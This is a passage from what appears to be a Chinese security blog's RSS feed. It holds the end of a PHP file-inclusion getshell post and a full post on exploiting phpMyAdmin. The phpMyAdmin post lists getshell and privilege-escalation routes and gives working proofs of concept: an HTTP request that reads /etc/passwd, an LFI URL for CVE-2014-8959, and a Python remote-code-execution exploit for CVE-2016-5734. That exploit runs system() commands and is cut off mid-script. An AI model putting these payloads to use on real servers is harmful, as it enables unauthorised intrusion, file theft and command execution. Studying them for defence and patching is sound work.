        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;[+] &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; / &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;times&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;upload_file_to_include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;phpinfo_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file_content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;generate_tmp_files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
&lt;p&gt;当找不到本地可包含的文件，有三种方法可行：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;产生临时文件，竞争条件getshell&lt;/li&gt;
&lt;li&gt;使用session.upload_process，包含session文件&lt;/li&gt;
&lt;li&gt;让PHP崩溃，同时产生临时文件或上传文件，都可被保留。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>phpMyAdmin 常见利用</title>
        <link>https://coollllllll.github.io/p/sql-phpmyadmin/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/sql-phpmyadmin/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/sql-phpmyadmin/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post phpMyAdmin 常见利用" /&gt;&lt;h1 id=&#34;phpmyadmin常见利用&#34;&gt;phpMyAdmin常见利用&lt;/h1&gt;
&lt;h2 id=&#34;获取版本信息&#34;&gt;获取版本信息&lt;/h2&gt;
&lt;p&gt;一般在根目录后加入：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;README
ChangeLog
doc/html/index.html
Change
changelog.php
readme.php
Documetation.html
Documetation.txt
translators.html
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;phpmyadmin权限&#34;&gt;phpMyAdmin权限&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;SQL注入获取账号密码&lt;/li&gt;
&lt;li&gt;暴破用户名密码&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;获取网站绝对路径&#34;&gt;获取网站绝对路径&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;phpinfo()&lt;/li&gt;
&lt;li&gt;利用报错页面&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@@datadir&lt;/code&gt;、&lt;code&gt;@@basedir&lt;/code&gt;根据数据库相关的绝对路径，猜测网站绝对路径&lt;/li&gt;
&lt;li&gt;使用load_file()函数读取一些默认配置文件去寻找路径，例如PHP配置文件、Apache/nginx配置文件等&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;利用&#34;&gt;利用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;写一句话getshell&lt;/li&gt;
&lt;li&gt;通过日志getshell&lt;/li&gt;
&lt;li&gt;UDF提权&lt;/li&gt;
&lt;li&gt;MOF提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;详情参见&lt;code&gt;MySQL提权相关、SQL注入相关&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&#34;其他漏洞&#34;&gt;其他漏洞&lt;/h2&gt;
&lt;h3 id=&#34;wooyun-2016-199433&#34;&gt;WooYun-2016-199433&lt;/h3&gt;
&lt;p&gt;任意文件读取&lt;/p&gt;
&lt;p&gt;phpMyAdmin2.x&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POC：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /scripts/setup.php HTTP/1.1 
Host: your-ip:8080
Accept-Encoding: gzip, deflate Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded Content-Length: 80

action=test&amp;amp;configuration=O:10:&amp;quot;PMA_Config&amp;quot;:1:{s:6:&amp;quot;source&amp;quot;,s:11:&amp;quot;/etc/passwd&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;cve-2014-8959&#34;&gt;CVE-2014-8959&lt;/h3&gt;
&lt;p&gt;本地文件包含&lt;/p&gt;
&lt;p&gt;phpMyAdmin 4.0.1&amp;ndash;4.2.12&lt;/p&gt;
&lt;p&gt;PHP version &amp;lt; 5.3.4&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POC：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&amp;amp;gis_data[gis_type]=/../../../../phpinfo.txt%00  

# 注意替换token值
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;cve-2016-5734&#34;&gt;CVE-2016-5734&lt;/h3&gt;
&lt;p&gt;后台RCE&lt;/p&gt;
&lt;p&gt;PhpMyAdmin：4.0.10.16 之前的4.0.x版本；4.4.15.7 之前的 4.4.x版本；4.6.3之前的 4.6.x版本&lt;/p&gt;
&lt;p&gt;PHP version： 4.3.0-5.4.6&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;POC：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;

&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;CVE: CVE-2016-5734
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Author: https://twitter.com/iamsecurity
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;run: ./cve-2016-5734.py -u root --pwd=&amp;#34;&amp;#34; http://localhost/pma -c &amp;#34;system(&amp;#39;ls -lua&amp;#39;);&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;

&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;argparse&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;sys&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;__author__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;@iamsecurity&amp;#34;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argparse&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;url&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;URL with path to PMA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-c&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--cmd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;PHP command(s) to eval()&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-u&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;required&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Valid PMA user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-p&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--pwd&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;required&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Password for valid PMA user&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--dbs&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Existing database at a server&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;add_argument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;-T&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;--table&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;help&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Custom table name for exploit.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;parser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parse_args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;url_to_pma&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;uname&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;user&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;upass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pwd&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbs&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;custom_table&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;custom_table&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;prgpwn&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;arguments&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cmd&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;system(&amp;#39;uname -a&amp;#39;);&amp;#34;&lt;/span&gt;

    &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;# you can manually add proxy support it&amp;#39;s very simple ;)&lt;/span&gt;
    &lt;span class=&#34;c1&#34;&gt;# s.proxies = {&amp;#39;http&amp;#39;: &amp;#34;127.0.0.1:8080&amp;#34;, &amp;#39;https&amp;#39;: &amp;#34;127.0.0.1:8080&amp;#34;}&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;verify&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;CREATE TABLE `&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{0}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;` (
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;      `first` varchar(10) CHARACTER SET utf8 NOT NULL
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    INSERT INTO `&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{0}&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;` (`first`) VALUES (UNHEX(&amp;#39;302F6500&amp;#39;));
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;c1&#34;&gt;# get_token&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url_to_pma&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/?lang=en&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;pma_username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uname&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;pma_password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;upass&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status_code&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;token_place&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;find&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;token=&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;resp&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token_place&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;token_place&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Cannot get valid authorization token.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;custom_table&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;is_js_confirmed&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;db&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;token&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
